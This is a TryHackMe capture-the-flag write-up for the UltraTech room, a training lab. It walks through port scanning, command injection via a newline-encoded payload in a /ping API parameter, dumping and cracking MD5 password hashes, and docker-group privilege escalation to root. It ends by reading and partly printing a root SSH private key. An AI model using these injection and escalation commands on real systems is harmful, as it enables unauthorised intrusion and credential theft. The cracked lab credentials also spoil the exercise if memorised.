# TryHackMe: UltraTech Writeup

**Room Link:** [UltraTech](https://tryhackme.com/room/ultratech1)

---

## Initial Enumeration

Starting with a full port scan:

```bash
nmap <target-ip> -p-
```

**Results:**
```text
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
```

### Service Identification

Running version detection on the non-standard ports:

```bash
nmap <target-ip> -sV -p8081,31331
```

**Results:**
```text
PORT      STATE SERVICE VERSION
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

- **Port 8081:** Node.js Express REST API
- **Port 31331:** Apache web server on Ubuntu

## Web Enumeration

### Apache Server (Port 31331)

Checking `robots.txt`:
```text
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

The sitemap reveals the following pages:
```text
/
/index.html
/what.html
/partners.html
```

`/partners.html` contains a login form. The team members listed on `/index.html` give us potential usernames:
- **r00t** (John McFamicom)
- **P4c0** (Francois LeMytho)
- **Sq4l** (Alvaro Squalo)

### Node.js API (Port 8081)

The API exposes two routes used by the web application. One notable endpoint is `/ping`, which accepts an IP parameter:

```
/ping?ip=<target-ip>
```

This returns the output of the `ping` command — our input is being executed in a shell.

## Exploitation: Command Injection

The `/ping` endpoint does not properly sanitize input. We can inject commands using `%0A` (URL-encoded newline):

```
/ping?ip=<attacker-ip>%0Als
```

This reveals the API directory contents:
```text
index.js  node_modules  package.json  package-lock.json  start.sh  utech.db.sqlite
```

### Dumping the Database

```
/ping?ip=<attacker-ip>%0Acat utech.db.sqlite
```

The SQLite database contains a `users` table with MD5 password hashes:

| Username | Hash |
|----------|------|
| r00t | `f357a0c52799563c7c7b76c1e7543a32` |
| admin | `0d0ea5111e3c1def594c1684e3b9be84` |

### Cracking the Hashes

Using Hashcat to crack the MD5 hashes:

```bash
hashcat -m 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt
hashcat -m 0 0d0ea5111e3c1def594c1684e3b9be84 /usr/share/wordlists/rockyou.txt
```

**Results:**
- **r00t:** `n100906`
- **admin:** `mrsheafy`

### Verifying Access

Logging in via the API:
```
/auth?login=r00t&password=n100906
```

Response:
```text
Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!
- lp1
```

## Initial Access via SSH

Using the cracked credentials to SSH in:

```bash
ssh r00t@<target-ip>
```

Checking our user context:
```bash
id
# uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

We are a member of the **docker** group — this is our privilege escalation vector.

## Privilege Escalation: Docker Group

Listing available Docker images:
```bash
docker images
```

```text
REPOSITORY   TAG      IMAGE ID       CREATED    SIZE
bash         latest   495d6437fc1e   6 years    15.8MB
```

Using the [GTFOBins Docker exploit](https://gtfobins.github.io/gtfobins/docker/) to mount the host filesystem and chroot into it:

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

```bash
whoami
# root
```

### Retrieving the SSH Private Key

```bash
cd /root/.ssh
cat id_rsa
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
...
-----END RSA PRIVATE KEY-----
```

The first 9 characters of this private key are the final answer for the room (redacted here — solve the room to get the exact value).
